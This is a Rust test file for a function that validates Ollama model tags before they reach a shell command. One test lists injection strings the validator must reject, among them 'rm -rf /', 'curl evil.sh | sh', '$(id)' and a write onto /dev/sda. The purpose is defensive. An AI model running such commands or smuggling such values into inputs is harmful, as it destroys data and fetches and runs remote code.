use super::*;

#[test]
fn accepts_the_tag_forms_ollama_uses() {
    for tag in [
        "llama3.2",
        "qwen2.5-coder:7b",
        "deepseek-r1:1.5b",
        "gemma3:270m",
        "mistral:latest",
        "library/llama3.2",
        "my_model-v2:q4_K_M",
    ] {
        assert!(
            validate_model_tag(tag).is_ok(),
            "should have accepted {tag:?}: {:?}",
            validate_model_tag(tag).err()
        );
    }
}

#[test]
fn trims_surrounding_whitespace() {
    assert_eq!(validate_model_tag("  mistral:7b \n").unwrap(), "mistral:7b");
}

#[test]
fn rejects_shell_shaped_input() {
    // This string is handed to a command, so anything that could change the
    // meaning of that command must not survive validation.
    for hostile in [
        "mistral; rm -rf /",
        "mistral && curl evil.sh | sh",
        "mistral`whoami`",
        "mistral$(id)",
        "mistral | tee /etc/passwd",
        "mistral\nrm -rf /",
        "mistral > /dev/sda",
        "$(curl evil)",
        "--flag-shaped",
    ] {
        assert!(
            validate_model_tag(hostile).is_err(),
            "accepted hostile input: {hostile:?}"
        );
    }
}

#[test]
fn rejects_empty_and_absurd_input() {
    assert!(validate_model_tag("").is_err());
    assert!(validate_model_tag("   ").is_err());
    assert!(validate_model_tag(&"a".repeat(200)).is_err());
}

#[test]
fn rejects_malformed_tags() {
    assert!(validate_model_tag(":7b").is_err(), "leading colon");
    assert!(validate_model_tag("a:b:c").is_err(), "two colons");
}

#[test]
fn error_messages_are_actionable() {
    let err = validate_model_tag("").unwrap_err().to_string();
    assert!(
        err.contains("qwen2.5-coder:7b"),
        "empty-input error should show an example, got: {err}"
    );
}

#[test]
fn catalog_source_explains_itself_only_when_degraded() {
    assert!(CatalogSource::Live.note().is_none());
    for degraded in [
        CatalogSource::BundledOffline,
        CatalogSource::BundledMarkupChanged,
    ] {
        let note = degraded.note().expect("degraded sources explain themselves");
        assert!(
            note.contains("built-in list"),
            "note should say the list is a fallback: {note}"
        );
    }
}

#[test]
fn binary_resolution_does_not_panic_without_ollama() {
    // Whether it resolves depends on the machine; it must never panic.
    let _ = resolve_binary();
    let _ = is_installed();
}
